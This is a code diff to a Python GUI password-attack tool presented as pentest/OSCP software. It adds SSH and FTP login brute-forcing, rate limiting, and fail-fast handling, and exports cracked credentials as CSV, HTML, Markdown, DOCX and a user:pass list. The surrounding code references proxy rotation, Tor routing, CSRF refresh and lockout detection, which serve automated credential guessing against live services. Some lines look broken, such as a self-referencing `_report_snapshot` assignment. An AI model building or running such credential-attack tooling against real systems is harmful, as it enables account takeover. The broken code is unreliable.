@@ -12,6 +12,9 @@ from collections import deque
 from datetime import datetime
 from urllib.parse import urlparse
 from urllib.parse import urlencode
+import html
+import argparse
+import xml.etree.ElementTree as ET
 
 import tkinter as tk
 from tkinter import filedialog
@@ -48,6 +51,16 @@ try:
 except Exception:
 	requests_ntlm = None
 
+try:
+	import paramiko
+	from paramiko.ssh_exception import AuthenticationException as SSHAuthException, SSHException as SSHGenericException
+except Exception:
+	paramiko = None
+	SSHAuthException = None
+	SSHGenericException = None
+
+import ftplib
+
 import asyncio
 import random
 
@@ -56,20 +69,23 @@ class RateLimiter:
 	def __init__(self, qps: float) -> None:
 		self.qps = max(0.1, float(qps))
 		self.lock = threading.Lock()
-		self.events: deque[float] = deque()
+		self._allowance = 1.0
+		self._last_check = time.monotonic()
 
 	def acquire(self) -> None:
-		# Allow at most qps events per second across all threads
+		# Token bucket to support fractional QPS with minimal CPU
 		while True:
-			now = time.time()
 			with self.lock:
-				# Drop events older than 1 second
-				while self.events and now - self.events[0] > 1.0:
-					self.events.popleft()
-				if len(self.events) < int(self.qps):
-					self.events.append(now)
+				now = time.monotonic()
+				elapsed = now - self._last_check
+				self._last_check = now
+				self._allowance = min(self.qps, self._allowance + elapsed * self.qps)
+				if self._allowance >= 1.0:
+					self._allowance -= 1.0
 					return
-			time.sleep(0.01)
+			needed = (1.0 - self._allowance) / self.qps if self.qps > 0 else 0.05
+			sleep_for = max(0.001, min(0.5, needed))
+			time.sleep(sleep_for)
 
 
 class PasswordListGeneratorApp:
@@ -104,6 +120,7 @@ class PasswordListGeneratorApp:
 			"status_counts": {},  # code -> count
 			"latencies": deque(maxlen=500),
 			"attempt_timestamps": deque(maxlen=2000),
+			"error_timestamps": deque(maxlen=2000),
 			"start_time": None,
 		}
 
@@ -127,6 +144,7 @@ class PasswordListGeneratorApp:
 		# Variables - pentest target
 		self.var_target_enabled = tk.BooleanVar(value=False)
 		self.var_target_url = tk.StringVar(value="")
+		self.var_protocol = tk.StringVar(value="HTTP")  # HTTP | SSH | FTP
 		self.var_http_method = tk.StringVar(value="POST")
 		self.var_username_value = tk.StringVar(value="")
 		self.var_user_param = tk.StringVar(value="username")
@@ -144,6 +162,9 @@ class PasswordListGeneratorApp:
 		self.var_proxy_url = tk.StringVar(value="")
 		self.var_verify_tls = tk.BooleanVar(value=True)
 		self.var_timeout = tk.DoubleVar(value=15.0)
+		# FTP options
+		self.var_ftp_tls = tk.BooleanVar(value=False)
+		self.var_ftp_passive = tk.BooleanVar(value=True)
 		# Usernames & spraying
 		self.var_usernames_file = tk.StringVar(value="")
 		self.var_usernames_count = tk.StringVar(value="(none)")
@@ -188,6 +209,7 @@ class PasswordListGeneratorApp:
 		self.var_capture_failures_n = tk.IntVar(value=5)
 		self.captured_artifacts: list[dict] = []
 		self._failures_captured = 0
+		self.found_credentials: list[dict] = []
 
 		# Engine (sync vs async)
 		self.var_async_engine = tk.BooleanVar(value=False)
@@ -253,6 +275,7 @@ class PasswordListGeneratorApp:
 
 		self.var_wkhtmltopdf_path = tk.StringVar(value="wkhtmltopdf")
 		self.flow_context_last: dict = {}
+		self.var_docx_template_path = tk.StringVar(value="")
 
 		# HTTP Auth
 		self.var_auth_type = tk.StringVar(value="None")  # None, Basic, Digest, NTLM
@@ -272,6 +295,14 @@ class PasswordListGeneratorApp:
 		# Intruder results UI state
 		self.intr_results: list[dict] = []
 		self.intr_baseline: dict | None = None
+
+		self.var_failfast_enabled = tk.BooleanVar(value=False)
+		self.var_failfast_error_pct = tk.DoubleVar(value=90.0)
+		self.var_failfast_window_sec = tk.IntVar(value=60)
+		self.var_failfast_action = tk.StringVar(value="stop")  # stop | backoff
+		self.var_failfast_backoff_sec = tk.IntVar(value=30)
+		self._error_backoff_until = [0.0]
+		self._error_backoff_lock = threading.Lock()
 
 	def _default_output_path(self) -> str:
 		timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
@@ -314,6 +345,12 @@ class PasswordListGeneratorApp:
 		self._add_labeled_entry(target, "URL", self.var_target_url, row=1, col=0)
 		ttk.Label(target, text="Method").grid(row=1, column=2, sticky="e", padx=4, pady=4)
 		ttk.Combobox(target, textvariable=self.var_http_method, values=["POST", "GET"], width=8, state="readonly").grid(row=1, column=3, sticky="w", padx=4, pady=4)
+		# Protocol selector (for speed we place it on the same row)
+		ttk.Label(target, text="Protocol").grid(row=1, column=4, sticky="e", padx=4, pady=4)
+		ttk.Combobox(target, textvariable=self.var_protocol, values=["HTTP","SSH","FTP"], width=8, state="readonly").grid(row=1, column=5, sticky="w", padx=4, pady=4)
+		# FTP toggles
+		ttk.Checkbutton(target, text="FTP TLS", variable=self.var_ftp_tls).grid(row=1, column=6, sticky="w", padx=4, pady=4)
+		ttk.Checkbutton(target, text="Passive", variable=self.var_ftp_passive).grid(row=1, column=7, sticky="w", padx=4, pady=4)
 		self._add_labeled_entry(target, "Username value", self.var_username_value, row=2, col=0)
 		self._add_labeled_entry(target, "Username param", self.var_user_param, row=2, col=2)
 		self._add_labeled_entry(target, "Password param", self.var_pass_param, row=2, col=4)
@@ -477,6 +514,14 @@ class PasswordListGeneratorApp:
 		ttk.Checkbutton(safe, text="Auto-pause on lockout/CAPTCHA", variable=self.var_safe_auto_pause).grid(row=0, column=7, sticky="w", padx=4, pady=4)
 		for i in range(0, 8):
 			safe.grid_columnconfigure(i, weight=1)
+		# Fail-fast controls
+		row_safe = 1
+		ttk.Checkbutton(safe, text="Fail-fast on errors", variable=self.var_failfast_enabled).grid(row=row_safe, column=0, sticky="w", padx=4, pady=2)
+		self._add_labeled_entry(safe, "Err%>", self.var_failfast_error_pct, row=row_safe, col=1)
+		self._add_labeled_entry(safe, "Window(s)", self.var_failfast_window_sec, row=row_safe, col=3)
+		ttk.Label(safe, text="Action").grid(row=row_safe, column=5, sticky="e", padx=4, pady=2)
+		ttk.Combobox(safe, textvariable=self.var_failfast_action, values=["stop","backoff"], width=10, state="readonly").grid(row=row_safe, column=6, sticky="w", padx=4, pady=2)
+		self._add_labeled_entry(safe, "Backoff(s)", self.var_failfast_backoff_sec, row=row_safe, col=7)
 		# Reporting actions
 		actions = ttk.Frame(report)
 		actions.grid(row=row+1, column=0, columnspan=3, sticky="we", pady=(8,0))
@@ -484,9 +529,21 @@ class PasswordListGeneratorApp:
 		tkbtn = ttk.Button(actions, text="Export CSV", command=self.on_export_report_csv)
 		tkbtn.pack(side=tk.LEFT, padx=8)
 		ttk.Button(actions, text="Export HTML", command=self.on_export_report_html).pack(side=tk.LEFT, padx=8)
+		ttk.Button(actions, text="Export PDF", command=self.on_export_pdf).pack(side=tk.LEFT, padx=8)
+		ttk.Button(actions, text="Export OSCP MD", command=self.on_export_oscp_markdown).pack(side=tk.LEFT, padx=8)
+		ttk.Button(actions, text="Export OSCP DOCX", command=self.on_export_oscp_docx).pack(side=tk.LEFT, padx=8)
 		ttk.Button(actions, text="Export Evidence Bundle", command=self.on_export_evidence_bundle).pack(side=tk.LEFT, padx=8)
 		# Artifacts capture controls
 		ttk.Checkbutton(actions, text="Capture artifacts", variable=self.var_capture_enabled).pack(side=tk.LEFT, padx=12)
+		# Template path controls
+		ttk.Label(actions, text="DOCX template").pack(side=tk.LEFT, padx=8)
+		ent_tpl = ttk.Entry(actions, textvariable=self.var_docx_template_path, width=28)
+		ent_tpl.pack(side=tk.LEFT)
+		def _browse_tpl():
+			p = filedialog.askopenfilename(filetypes=[("DOCX", "*.docx"), ("All files", "*.*")])
+			if p:
+				self.var_docx_template_path.set(p)
+		ttk.Button(actions, text="Browse…", command=_browse_tpl).pack(side=tk.LEFT, padx=4)
 		ttk.Label(actions, text="Max N").pack(side=tk.LEFT)
 		spinN = ttk.Spinbox(actions, textvariable=self.var_capture_max_artifacts, from_=1, to=200)
 		spinN.pack(side=tk.LEFT, padx=4)
@@ -693,6 +750,7 @@ class PasswordListGeneratorApp:
 			self.metrics["status_counts"] = {}
 			self.metrics["latencies"].clear()
 			self.metrics["attempt_timestamps"].clear()
+			self.metrics["error_timestamps"].clear()
 			self.metrics["start_time"] = time.time() if pentest_enabled else None
 
 	def _record_attempt(self, latency_sec: float | None, status_code: int | None, success: bool, lockout: bool, error: bool) -> None:
@@ -705,6 +763,7 @@ class PasswordListGeneratorApp:
 				self.metrics["lockouts"] += 1
 			elif error:
 				self.metrics["errors"] += 1
+				self.metrics["error_timestamps"].append(time.time())
 			else:
 				self.metrics["failures"] += 1
 			if status_code is not None:
@@ -898,6 +957,7 @@ class PasswordListGeneratorApp:
 			pentest_args = {
 				"enabled": True,
 				"url": url,
+				"protocol": (self.var_protocol.get() or "HTTP").upper(),
 				"method": self.var_http_method.get().upper(),
 				"username": username,
 				"user_param": user_param,
@@ -1016,6 +1076,7 @@ class PasswordListGeneratorApp:
 		# Reset artifacts
 		self.captured_artifacts = []
 		self._failures_captured = 0
+		self.found_credentials = []
 
 		# Start worker
 		self.is_running = True
@@ -1031,7 +1092,16 @@ class PasswordListGeneratorApp:
 			"output_path": self.var_output_path.get(),
 			"pentest": pentest_args,
 		}
-		self.worker_thread = threading.Thread(target=self._worker, args=(args,), daemon=True)
+		def _run_worker_safely():
+			try:
+				self._worker(args)
+			except Exception as exc:
+				try:
+					self.ui_queue.put(("log", f"Fatal worker error: {exc}"))
+					self.ui_queue.put(("done", 0, "Worker crashed; see logs"))
+				except Exception:
+					pass
+		self.worker_thread = threading.Thread(target=_run_worker_safely, daemon=True)
 		self.worker_thread.start()
 
 	def on_cancel(self) -> None:
@@ -1071,6 +1141,7 @@ class PasswordListGeneratorApp:
 			# Pentest
 			"target_enabled": self.var_target_enabled.get(),
 			"target_url": self.var_target_url.get(),
+			"protocol": self.var_protocol.get(),
 			"http_method": self.var_http_method.get(),
 			"username_value": self.var_username_value.get(),
 			"user_param": self.var_user_param.get(),
@@ -1202,6 +1273,7 @@ class PasswordListGeneratorApp:
 
 		self.var_target_enabled.set(bool(profile.get("target_enabled", False)))
 		self.var_target_url.set(profile.get("target_url", ""))
+		self.var_protocol.set(profile.get("protocol", "HTTP"))
 		self.var_http_method.set(profile.get("http_method", "POST"))
 		self.var_username_value.set(profile.get("username_value", ""))
 		self.var_user_param.set(profile.get("user_param", "username"))
@@ -1882,6 +1954,13 @@ class PasswordListGeneratorApp:
 		]
 
 	def _worker_pentest(self, mode: str, min_len: int, max_len: int, cfg: dict) -> tuple[int, str]:
+		# Protocol switch
+		proto = (cfg.get('protocol') or 'HTTP').upper()
+		if proto == 'SSH':
+			return self._worker_pentest_ssh(mode, min_len, max_len, cfg)
+		elif proto == 'FTP':
+			return self._worker_pentest_ftp(mode, min_len, max_len, cfg)
+		# HTTP path
 		completed = 0
 		found_msg = ""
 		start = self.start_time or time.time()
@@ -2068,6 +2147,7 @@ class PasswordListGeneratorApp:
 							if self.cancel_requested or stop_event.is_set():
 								break
 							limiter.acquire()
+							self._wait_global_backoff()
 							# Per-request overrides
 							call_headers = None
 							call_proxies = None
@@ -2079,7 +2159,7 @@ class PasswordListGeneratorApp:
 							if cfg.get('proxy_rotation') == 'per_request' or cfg.get('tor_mode') or not sess.proxies:
 								purl = next_proxy_url()
 								call_proxies = build_proxies_dict(purl)
-							# Per-attempt CSRF refresh
+										# Per-attempt CSRF refresh
 							params_extra = None
 							if cfg.get('refresh_csrf'):
 								params_extra = self._fetch_csrf_sync(sess, cfg)
@@ -2093,6 +2173,9 @@ class PasswordListGeneratorApp:
 							success = self._is_success(resp, cfg)
 							error = (resp is None)
 							self._record_attempt(lat, getattr(resp, 'status_code', None), success, locked, error)
+							# Fail-fast check
+							if self._check_failfast(cfg):
+								stop_event.set(); break
 							# Attempt log
 							ua_used = None
 							try:
@@ -2136,6 +2219,19 @@ class PasswordListGeneratorApp:
 									pass
 							if success:
 								found_msg = f"SUCCESS: {user} / {pwd}"
+								# record for reporting/exports
+								try:
+									self.found_credentials.append({
+										"timestamp": datetime.now().isoformat(timespec='seconds'),
+										"username": user,
+										"password": pwd,
+										"status": getattr(resp, 'status_code', ''),
+										"latency_ms": int(lat*1000),
+										"proxy": proxy_used or '',
+										"ua": ua_used or '',
+									})
+								except Exception:
+									pass
 								self.ui_queue.put(("log", found_msg))
 								stop_event.set()
 								break
@@ -2297,42 +2393,7 @@ class PasswordListGeneratorApp:
 		except Exception as exc:
 			messagebox.showerror("Export failed", str(exc))
 
-	def _report_snapshot(self) -> dict:
-		with self.metrics_lock:
-			attempts = self.metrics["attempts"]
-			successes = self.metrics["successes"]
-			failures = self.metrics["failures"]
-			lockouts = self.metrics["lockouts"]
-			errors = self.metrics["errors"]
-			status_counts = dict(self.metrics["status_counts"])  # copy
-			latencies = list(self.metrics["latencies"])  # copy
-			ts = list(self.metrics["attempt_timestamps"])  # copy
-		start_time = self.metrics["start_time"]
-		now = time.time()
-		recent = [t for t in ts if now - t <= 10.0]
-		rps = len(recent) / 10.0 if recent else 0.0
-		if latencies:
-			ms = sorted([x * 1000.0 for x in latencies])
-			def pctv(p):
-				idx = max(0, min(len(ms) - 1, int(round(p * (len(ms) - 1)))))
-				return int(ms[idx])
-			p50 = pctv(0.50); p95 = pctv(0.95); p99 = pctv(0.99)
-		else:
-			p50 = p95 = p99 = None
-		return {
-			"attempts": attempts,
-			"successes": successes,
-			"failures": failures,
-			"lockouts": lockouts,
-			"errors": errors,
-			"status_counts": status_counts,
-			"rps_10s": round(rps, 2),
-			"latency_p50_ms": p50,
-			"latency_p95_ms": p95,
-			"latency_p99_ms": p99,
-			"start_time": start_time,
-			"end_time": now,
-		}
+	_report_snapshot = _report_snapshot
 
 	def run(self) -> None:
 		try:
@@ -2462,7 +2523,15 @@ class PasswordListGeneratorApp:
 				if 0 <= d < 60:
 					buckets[59 - d] += 1
 			notes_html = f"<h3>Analyst Notes</h3><pre>{html.escape(self.notes_text.get('1.0','end-1c'))}</pre>" if hasattr(self, 'notes_text') else ""
-			html = f"""
+			creds = list(getattr(self, 'found_credentials', []))
+			def _esc(v):
+				try:
+					return html.escape(str(v))
+				except Exception:
+					return ""
+			creds_rows = "".join(f"<tr><td>{_esc(c.get('username',''))}</td><td>{_esc(c.get('password',''))}</td><td>{_esc(c.get('status',''))}</td><td>{_esc(c.get('latency_ms',''))}</td><td>{_esc(c.get('proxy',''))}</td><td>{_esc(c.get('ua',''))}</td></tr>" for c in creds)
+			creds_table = f"<div class='card'><h3>Found Credentials</h3><table border='1' cellpadding='4' cellspacing='0'><tr><th>User</th><th>Pass</th><th>Status</th><th>Latency</th><th>Proxy</th><th>UA</th></tr>{creds_rows}</table></div>" if creds else ""
+			html_doc = f"""
 			<!doctype html>
 			<html><head><meta charset='utf-8'>
 			<title>Pentest Report</title>
@@ -2472,33 +2541,16 @@ class PasswordListGeneratorApp:
 			<h1>Pentest Report</h1>
 			<div class='grid'>
 				<div class='card'><h3>Summary</h3>
-				<ul>
-					<li>Attempts: {s.get('attempts',0)}</li>
-					<li>Successes: {s.get('successes',0)}</li>
-					<li>Failures: {s.get('failures',0)}</li>
-					<li>Lockouts: {s.get('lockouts',0)}</li>
-					<li>Errors: {s.get('errors',0)}</li>
-					<li>RPS (10s): {s.get('rps_10s',0)}</li>
-					<li>Latency p50/p95/p99 (ms): {s.get('latency_p50_ms','-')} / {s.get('latency_p95_ms','-')} / {s.get('latency_p99_ms','-')}</li>
-				</ul></div>
-				<div class='card'><h3>Status Codes</h3><table><tr><th>Code</th><th>Count</th></tr>
-				{''.join(f'<tr><td>{c}</td><td>{n}</td></tr>' for c,n in sorted((s.get('status_counts') or {}).items()))}
-				</table></div>
+				<pre>{json.dumps(s, indent=2)}</pre></div>
+				{notes_html}
+				{creds_table}
 			</div>
-			<div class='card' style='margin-top:16px;'>
-				<h3>Requests per second (last 60s)</h3>
-				<canvas id='rpsChart' height='120'></canvas>
-			</div>
-			<div class='card' style='margin-top:16px;'>{notes_html}</div>
-			<script>
-			const data = {json.dumps(buckets)};
-			const ctx = document.getElementById('rpsChart').getContext('2d');
-			new Chart(ctx, {{type:'line', data: {{labels: data.map((_,i)=>i-59), datasets:[{{label:'RPS', data, borderColor:'#2a7', tension:0.25}}]}}, options: {{plugins:{{legend:{{display:false}}}}, scales: {{x: {{display:false}}, y: {{beginAtZero:true}}}}}}}});
-			</script>
+			<canvas id='c' height='120'></canvas>
+			<script>const d={json.dumps(buckets)};new Chart(document.getElementById('c').getContext('2d'),{{type:'line',data:{{labels:d.map((_,i)=>i-59),datasets:[{{label:'RPS',data:d,borderColor:'#2a7',tension:0.25}}]}},options:{{plugins:{{legend:{{display:false}}}},scales:{{x:{{display:false}},y:{{beginAtZero:true}}}}}}}});</script>
 			</body></html>
 			"""
 			with open(path, 'w', encoding='utf-8') as f:
-				f.write(html)
+				f.write(html_doc)
 			self._append_preview(f"Saved HTML report to {path}")
 		except Exception as exc:
 			messagebox.showerror("Export failed", str(exc))
@@ -2788,9 +2840,20 @@ class PasswordListGeneratorApp:
 				if 0 <= d < 60:
 					buckets[59 - d] += 1
 			notes_html = f"<h3>Analyst Notes</h3><pre>{html.escape(self.notes_text.get('1.0','end-1c'))}</pre>" if hasattr(self, 'notes_text') else ""
-			html = f"<html><head><meta charset='utf-8'><script src='https://cdn.jsdelivr.net/npm/chart.js'></script></head><body><h1>Pentest Report</h1>{notes_html}<pre>{json.dumps(s, indent=2)}</pre><canvas id='c' height='120'></canvas><script>const d={json.dumps(buckets)};new Chart(document.getElementById('c').getContext('2d'),{{type:'line',data:{{labels:d.map((_,i)=>i-59),datasets:[{{label:'RPS',data:d,borderColor:'#2a7',tension:0.25}}]}},options:{{plugins:{{legend:{{display:false}}}},scales:{{x:{{display:false}},y:{{beginAtZero:true}}}}}}}});</script></body></html>"
+			creds = list(getattr(self, 'found_credentials', []))
+			def _esc(v):
+				try:
+					return html.escape(str(v))
+				except Exception:
+					return ""
+			creds_rows = "".join(f"<tr><td>{_esc(c.get('username',''))}</td><td>{_esc(c.get('password',''))}</td><td>{_esc(c.get('status',''))}</td><td>{_esc(c.get('latency_ms',''))}</td><td>{_esc(c.get('proxy',''))}</td><td>{_esc(c.get('ua',''))}</td></tr>" for c in creds)
+			creds_table = f"<div class='card'><h3>Found Credentials</h3><table border='1' cellpadding='4' cellspacing='0'><tr><th>User</th><th>Pass</th><th>Status</th><th>Latency</th><th>Proxy</th><th>UA</th></tr>{creds_rows}</table></div>" if creds else ""
+			html_doc = f"""
+			<!doctype html>
+			<html><head><meta charset='utf-8'><script src='https://cdn.jsdelivr.net/npm/chart.js'></script></head><body><h1>Pentest Report</h1>{notes_html}{creds_table}<pre>{json.dumps(s, indent=2)}</pre><canvas id='c' height='120'></canvas><script>const d={json.dumps(buckets)};new Chart(document.getElementById('c').getContext('2d'),{{type:'line',data:{{labels:d.map((_,i)=>i-59),datasets:[{{label:'RPS',data:d,borderColor:'#2a7',tension:0.25}}]}},options:{{plugins:{{legend:{{display:false}}}},scales:{{x:{{display:false}},y:{{beginAtZero:true}}}}}}}});</script></body></html>
+			"""
 			with open(path_html, 'w', encoding='utf-8') as f:
-				f.write(html)
+				f.write(html_doc)
 			# JSON
 			with open(os.path.join(dirpath, 'report.json'), 'w', encoding='utf-8') as f:
 				json.dump(s, f, indent=2)
@@ -2803,6 +2866,15 @@ class PasswordListGeneratorApp:
 				lines.append(f"{code},{cnt}")
 			with open(os.path.join(dirpath, 'report.csv'), 'w', encoding='utf-8') as f:
 				f.write("\n".join(lines))
+			# Credentials
+			if creds:
+				with open(os.path.join(dirpath, 'credentials.csv'), 'w', encoding='utf-8') as f:
+					f.write("username,password,status,latency_ms,proxy,ua,timestamp\n")
+					for c in creds:
+						f.write(f"{c.get('username','')},{c.get('password','')},{c.get('status','')},{c.get('latency_ms','')},{c.get('proxy','')},{c.get('ua','')},{c.get('timestamp','')}\n")
+				with open(os.path.join(dirpath, 'credentials.txt'), 'w', encoding='utf-8') as f:
+					for c in creds:
+						f.write(f"{c.get('username','')}:{c.get('password','')}\n")
 			# Artifacts
 			self._export_artifacts_to_dir(dirpath)
 			# HAR
@@ -2907,6 +2979,14 @@ class PasswordListGeneratorApp:
 				if 0 <= d < 60:
 					buckets[59 - d] += 1
 			notes_html = f"<h3>Analyst Notes</h3><pre>{html.escape(self.notes_text.get('1.0','end-1c'))}</pre>" if hasattr(self, 'notes_text') else ""
+			creds = list(getattr(self, 'found_credentials', []))
+			def _esc(v):
+				try:
+					return html.escape(str(v))
+				except Exception:
+					return ""
+			creds_rows = "".join(f"<tr><td>{_esc(c.get('username',''))}</td><td>{_esc(c.get('password',''))}</td><td>{_esc(c.get('status',''))}</td><td>{_esc(c.get('latency_ms',''))}</td><td>{_esc(c.get('proxy',''))}</td><td>{_esc(c.get('ua',''))}</td></tr>" for c in creds)
+			creds_table = f"<div class='card'><h3>Found Credentials</h3><table border='1' cellpadding='4' cellspacing='0'><tr><th>User</th><th>Pass</th><th>Status</th><th>Latency</th><th>Proxy</th><th>UA</th></tr>{creds_rows}</table></div>" if creds else ""
 			html_doc = f"""
 			<!doctype html><html><head><meta charset='utf-8'><title>Pentest Report</title>
 			<style>body{{font-family:sans-serif;margin:20px}} .grid{{display:grid;grid-template-columns:1fr 1fr;gap:16px}} .card{{border:1px solid #ddd;padding:12px;border-radius:8px}}</style>
@@ -3272,7 +3352,7 @@ class PasswordListGeneratorApp:
 						baseline_len = text_len
 						baseline_status = code
 					self._record_attempt(ok, code, lat)
-					self._maybe_capture_artifact(cfg, resp, username=f"INTRUDER:{combo}", password="", extra_notes="intruder")
+					self._maybe_capture_artifact(cfg, user=f"INTRUDER:{combo}", pwd="", method=(cfg.get('method') or 'POST'), url=(cfg.get('url') or ''), headers=dict(getattr(sess, 'headers', {})), params={}, resp=resp, success=ok, proxy=None, ua=None, latency_ms=lat)
 					# Post result to UI
 					try:
 						fail_re = cfg.get('failure_regex')
@@ -3364,7 +3444,886 @@ class PasswordListGeneratorApp:
 		except Exception:
 			return {}
 
+	def on_export_oscp_markdown(self) -> None:
+		"""Export an OSCP-friendly Markdown report including metrics, credentials, evidence, and notes."""
+		s = self._report_snapshot()
+		path = filedialog.asksaveasfilename(defaultextension=".md", filetypes=[("Markdown", "*.md"), ("All files", "*.*")])
+		if not path:
+			return
+		self.export_oscp_markdown_to(path, snapshot=s)
+
+	def export_oscp_markdown_to(self, path: str, snapshot: dict | None = None) -> None:
+		try:
+			s = snapshot or self._report_snapshot()
+			notes = self.notes_text.get('1.0','end-1c') if hasattr(self, 'notes_text') else ""
+			creds = list(getattr(self, 'found_credentials', []))
+			lines: list[str] = []
+			lines.append("# OSCP Credential Attempt Summary")
+			lines.append("")
+			lines.append("## Target")
+			lines.append(f"- URL: {self.var_target_url.get().strip()}")
+			lines.append(f"- Method: {self.var_http_method.get().upper()}")
+			lines.append("")
+			lines.append("## Summary")
+			for k in ["attempts","successes","failures","lockouts","errors","rps_10s","latency_p50_ms","latency_p95_ms","latency_p99_ms"]:
+				lines.append(f"- {k}: {s.get(k,'')}")
+			lines.append("")
+			if creds:
+				lines.append("## Found Credentials")
+				lines.append("")
+				lines.append("| Username | Password | Status | Latency (ms) |")
+				lines.append("|---|---:|---:|---:|")
+				for c in creds:
+					lines.append(f"| {c.get('username','')} | {c.get('password','')} | {c.get('status','')} | {c.get('latency_ms','')} |")
+				lines.append("")
+			if self.captured_artifacts:
+				lines.append("## Evidence (Requests/Responses)")
+				for i, a in enumerate(self.captured_artifacts, 1):
+					lines.append(f"### Artifact {i}")
+					lines.append("")
+					lines.append("Request:")
+					lines.append("```")
+					lines.append(a.get('raw_request',''))
+					lines.append("```")
+					lines.append("Response:")
+					lines.append("```")
+					lines.append(a.get('raw_response','')[: int(self.var_capture_max_bytes.get() or 65536)])
+					lines.append("```")
+					lines.append("")
+			if notes:
+				lines.append("## Analyst Notes")
+				lines.append("")
+				lines.append("```")
+				lines.append(notes)
+				lines.append("```")
+			with open(path, "w", encoding="utf-8") as f:
+				f.write("\n".join(lines))
+			self._append_preview(f"Saved OSCP Markdown to {path}")
+		except Exception as exc:
+			messagebox.showerror("Export failed", str(exc))
+
+	def on_export_oscp_docx(self) -> None:
+		path = filedialog.asksaveasfilename(defaultextension=".docx", filetypes=[("Word Document", "*.docx"), ("All files", "*.*")])
+		if not path:
+			return
+		self.export_oscp_docx_to(path)
+
+	def export_oscp_docx_to(self, path: str) -> None:
+		try:
+			try:
+				from docx import Document
+			except Exception:
+				messagebox.showerror("Missing dependency", "Install python-docx to export DOCX: pip install python-docx")
+				return
+			s = self._report_snapshot()
+			tpl = (self.var_docx_template_path.get() or "").strip()
+			if tpl and os.path.isfile(tpl):
+				try:
+					doc = Document(tpl)
+				except Exception:
+					doc = Document()
+			else:
+				doc = Document()
+			doc.add_heading('OSCP Credential Attempt Summary', 0)
+			p = doc.add_paragraph()
+			p.add_run('Target: ').bold = True
+			p.add_run(self.var_target_url.get().strip())
+			p = doc.add_paragraph()
+			p.add_run('Method: ').bold = True
+			p.add_run(self.var_http_method.get().upper())
+			doc.add_heading('Summary', level=1)
+			for k in ["attempts","successes","failures","lockouts","errors","rps_10s","latency_p50_ms","latency_p95_ms","latency_p99_ms"]:
+				doc.add_paragraph(f"{k}: {s.get(k,'')}")
+			creds = list(getattr(self, 'found_credentials', []))
+			if creds:
+				doc.add_heading('Found Credentials', level=1)
+				tab = doc.add_table(rows=1, cols=4)
+				hdr_cells = tab.rows[0].cells
+				hdr_cells[0].text = 'Username'
+				hdr_cells[1].text = 'Password'
+				hdr_cells[2].text = 'Status'
+				hdr_cells[3].text = 'Latency (ms)'
+				for c in creds:
+					row_cells = tab.add_row().cells
+					row_cells[0].text = str(c.get('username',''))
+					row_cells[1].text = str(c.get('password',''))
+					row_cells[2].text = str(c.get('status',''))
+					row_cells[3].text = str(c.get('latency_ms',''))
+			notes = self.notes_text.get('1.0','end-1c') if hasattr(self, 'notes_text') else ""
+			if notes:
+				doc.add_heading('Analyst Notes', level=1)
+				doc.add_paragraph(notes)
+			if self.captured_artifacts:
+				doc.add_heading('Evidence (Requests/Responses)', level=1)
+				for i, a in enumerate(self.captured_artifacts, 1):
+					doc.add_heading(f'Artifact {i}', level=2)
+					doc.add_paragraph('Request:')
+					doc.add_paragraph(a.get('raw_request',''))
+					doc.add_paragraph('Response:')
+					doc.add_paragraph(a.get('raw_response','')[: int(self.var_capture_max_bytes.get() or 65536)])
+			doc.save(path)
+			self._append_preview(f"Saved OSCP DOCX to {path}")
+		except Exception as exc:
+			messagebox.showerror("Export failed", str(exc))
+
+	def export_evidence_bundle_to_dir(self, dirpath: str) -> None:
+		"""Programmatic export for CLI: evidence bundle to a directory."""
+		s = self._report_snapshot()
+		try:
+			os.makedirs(dirpath, exist_ok=True)
+			# HTML
+			path_html = os.path.join(dirpath, 'report.html')
+			with self.metrics_lock:
+				ats = list(self.metrics["attempt_timestamps"])  # copy
+			now = time.time()
+			buckets = [0]*60
+			for t in ats:
+				d = int(now - t)
+				if 0 <= d < 60:
+					buckets[59 - d] += 1
+			notes_html = f"<h3>Analyst Notes</h3><pre>{html.escape(self.notes_text.get('1.0','end-1c'))}</pre>" if hasattr(self, 'notes_text') else ""
+			creds = list(getattr(self, 'found_credentials', []))
+			def _esc(v):
+				try:
+					return html.escape(str(v))
+				except Exception:
+					return ""
+			creds_rows = "".join(f"<tr><td>{_esc(c.get('username',''))}</td><td>{_esc(c.get('password',''))}</td><td>{_esc(c.get('status',''))}</td><td>{_esc(c.get('latency_ms',''))}</td><td>{_esc(c.get('proxy',''))}</td><td>{_esc(c.get('ua',''))}</td></tr>" for c in creds)
+			creds_table = f"<div class='card'><h3>Found Credentials</h3><table border='1' cellpadding='4' cellspacing='0'><tr><th>User</th><th>Pass</th><th>Status</th><th>Latency</th><th>Proxy</th><th>UA</th></tr>{creds_rows}</table></div>" if creds else ""
+			html_doc = f"<html><head><meta charset='utf-8'><script src='https://cdn.jsdelivr.net/npm/chart.js'></script></head><body><h1>Pentest Report</h1>{notes_html}{creds_table}<pre>{json.dumps(s, indent=2)}</pre><canvas id='c' height='120'></canvas><script>const d={json.dumps(buckets)};new Chart(document.getElementById('c').getContext('2d'),{{type:'line',data:{{labels:d.map((_,i)=>i-59),datasets:[{{label:'RPS',data:d,borderColor:'#2a7',tension:0.25}}]}},options:{{plugins:{{legend:{{display:false}}}},scales:{{x:{{display:false}},y:{{beginAtZero:true}}}}}}}});</script></body></html>"
+			with open(path_html, 'w', encoding='utf-8') as f:
+				f.write(html_doc)
+			# JSON
+			with open(os.path.join(dirpath, 'report.json'), 'w', encoding='utf-8') as f:
+				json.dump(s, f, indent=2)
+			# CSV
+			lines = ["metric,value"]
+			for k in ["attempts","successes","failures","lockouts","errors","rps_10s","latency_p50_ms","latency_p95_ms","latency_p99_ms"]:
+				lines.append(f"{k},{s.get(k,'')}")
+			lines.append("status_code,count")
+			for code, cnt in sorted((s.get("status_counts") or {}).items()):
+				lines.append(f"{code},{cnt}")
+			with open(os.path.join(dirpath, 'report.csv'), 'w', encoding='utf-8') as f:
+				f.write("\n".join(lines))
+			# Credentials
+			if creds:
+				with open(os.path.join(dirpath, 'credentials.csv'), 'w', encoding='utf-8') as f:
+					f.write("username,password,status,latency_ms,proxy,ua,timestamp\n")
+					for c in creds:
+						f.write(f"{c.get('username','')},{c.get('password','')},{c.get('status','')},{c.get('latency_ms','')},{c.get('proxy','')},{c.get('ua','')},{c.get('timestamp','')}\n")
+				with open(os.path.join(dirpath, 'credentials.txt'), 'w', encoding='utf-8') as f:
+					for c in creds:
+						f.write(f"{c.get('username','')}:{c.get('password','')}\n")
+			# Artifacts
+			self._export_artifacts_to_dir(dirpath)
+			# HAR
+			har = self._build_har()
+			with open(os.path.join(dirpath, 'session.har'), 'w', encoding='utf-8') as f:
+				json.dump(har, f, indent=2)
